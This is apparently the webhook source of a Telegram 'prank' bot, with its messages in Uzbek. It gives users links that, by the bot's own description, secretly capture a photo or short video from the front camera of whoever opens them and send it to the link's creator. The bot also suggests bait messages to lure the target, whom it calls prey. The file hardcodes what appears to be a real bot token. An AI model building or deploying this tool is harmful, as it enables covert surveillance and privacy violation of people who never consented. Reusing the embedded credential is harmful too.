// Telegram Bot Webhook Handler (Vercel Serverless Function)
const BOT_TOKEN = process.env.BOT_TOKEN || '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';

async function tg(method, body) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
    return await res.json();
  } catch (e) {
    console.error(`Telegram API xatosi (${method}):`, e);
    return { ok: false, error: e.message };
  }
}

module.exports = async (req, res) => {
  // Agar brauzer orqali ochilsa (GET)
  if (req.method === 'GET') {
    return res.status(200).json({
      ok: true,
      service: 'Telegram Prank Bot Webhook',
      status: 'Faol ishlab turibdi',
      time: new Date().toISOString()
    });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Faqat POST so\'rov qabul qilinadi' });
  }

  const update = req.body;
  if (!update) {
    return res.status(200).send('OK');
  }

  // Sayt domenini avtomatik aniqlash
  const host = req.headers['x-forwarded-host'] || req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'https';
  const baseUrl = process.env.APP_URL || (host ? `${protocol}://${host}` : '');

  // 1. Tugma bosilganda (Callback Query)
  if (update.callback_query) {
    const cq = update.callback_query;
    const chatId = cq.message?.chat?.id || cq.from?.id;
    const data = cq.data;

    // Tugma yuklanishini to'xtatish
    await tg('answerCallbackQuery', { callback_query_id: cq.id });

    if (data === 'photo') {
      const link = `${baseUrl}/?id=${chatId}&type=photo`;
      const text =
        `📸 <b>Foto Prank havolangiz tayyor!</b>\n\n` +
        `Ushbu havolani nusxalab, do'stingizga yuboring:\n` +
        `👉 <code>${link}</code>\n\n` +
        `⚡️ <b>Qanday ishlaydi?</b>\n` +
        `Do'stingiz ushbu havolaga kirishi bilan uning old kamerasidan surat olinadi va sizga shu bot orqali yuboriladi!\n\n` +
        `💡 <i>Maslahat: "Bu rasmdagi senmisan?", "Qara, bu saytda nima chiqdi!" kabi qiziqarli gap bilan yuborsangiz o'lja darhol kiradi.</i>`;

      await tg('sendMessage', {
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '🎥 Video havolasini olish', callback_data: 'video' }],
            [{ text: '🔄 Havolani yangilash', callback_data: 'photo' }]
          ]
        }
      });
    } else if (data === 'video') {
      const link = `${baseUrl}/?id=${chatId}&type=video`;
      const text =
        `🎥 <b>Video Prank havolangiz tayyor!</b>\n\n` +
        `Ushbu havolani nusxalab, do'stingizga yuboring:\n` +
        `👉 <code>${link}</code>\n\n` +
        `⚡️ <b>Qanday ishlaydi?</b>\n` +
        `Do'stingiz ushbu havolaga kirganda uning old kamerasidan 3 soniyalik qisqa video olinadi va to'g'ridan-to'g'ri sizga yuboriladi!\n\n` +
        `💡 <i>Maslahat: Havolani do'stingizga qiziqarli matn bilan yuboring.</i>`;

      await tg('sendMessage', {
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '📸 Foto havolasini olish', callback_data: 'photo' }],
            [{ text: '🔄 Havolani yangilash', callback_data: 'video' }]
          ]
        }
      });
    } else if (data === 'help') {
      const text =
        `ℹ️ <b>Botdan foydalanish qo'llanmasi:</b>\n\n` +
        `1. 📸 <b>Foto</b> yoki 🎥 <b>Video</b> tugmasidan birini tanlang.\n` +
        `2. Bot sizga shaxsiy maxsus havola taqdim etadi.\n` +
        `3. Shu havolani do'stingizga yuboring.\n` +
        `4. Do'stingiz havolani ochishi bilan uning kamerasi orqali surat/video yozib olinadi va sizga keladi.\n\n` +
        `⚠️ <i>Eslatma: Ushbu bot faqat do'stlar orasida xushchaqchaq hazil (prank) uchun mo'ljallangan!</i>`;

      await tg('sendMessage', {
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '📸 Foto uchun havola', callback_data: 'photo' },
              { text: '🎥 Video uchun havola', callback_data: 'video' }
            ]
          ]
        }
      });
    }

    return res.status(200).send('OK');
  }

  // 2. Foydalanuvchi xabar yozganda (/start va boshqalar)
  if (update.message) {
    const msg = update.message;
    const chatId = msg.chat?.id;
    const text = (msg.text || '').trim();
    const name = msg.from?.first_name || 'foydalanuvchi';

    if (text.startsWith('/start')) {
      const welcomeText =
        `👋 <b>Assalomu alaykum, ${name}!</b>\n\n` +
        `Bu bot orqali siz do'stlaringizga maxsus <b>hazil (prank)</b> havolalari yaratishingiz mumkin.\n\n` +
        `Do'stingiz havolani ochishi bilan uning old kamerasidan rasm yoki video olinib, to'g'ridan-to'g'ri sizga yuboriladi!\n\n` +
        `👇 <b>Qaysi turdagi havolani yaratmoqchisiz? Tanlang:</b>`;

      await tg('sendMessage', {
        chat_id: chatId,
        text: welcomeText,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '📸 Foto uchun havola', callback_data: 'photo' },
              { text: '🎥 Video uchun havola', callback_data: 'video' }
            ],
            [
              { text: 'ℹ️ Qanday ishlatiladi?', callback_data: 'help' }
            ]
          ]
        }
      });
    } else if (text === '/photo') {
      const link = `${baseUrl}/?id=${chatId}&type=photo`;
      await tg('sendMessage', {
        chat_id: chatId,
        text: `📸 <b>Foto Prank havolangiz:</b>\n👉 <code>${link}</code>`,
        parse_mode: 'HTML'
      });
    } else if (text === '/video') {
      const link = `${baseUrl}/?id=${chatId}&type=video`;
      await tg('sendMessage', {
        chat_id: chatId,
        text: `🎥 <b>Video Prank havolangiz:</b>\n👉 <code>${link}</code>`,
        parse_mode: 'HTML'
      });
    } else {
      await tg('sendMessage', {
        chat_id: chatId,
        text: `Iltimos, pastdagi tugmalardan birini tanlang:`,
        reply_markup: {
          inline_keyboard: [
            [
              { text: '📸 Foto uchun havola', callback_data: 'photo' },
              { text: '🎥 Video uchun havola', callback_data: 'video' }
            ]
          ]
        }
      });
    }

    return res.status(200).send('OK');
  }

  return res.status(200).send('OK');
};
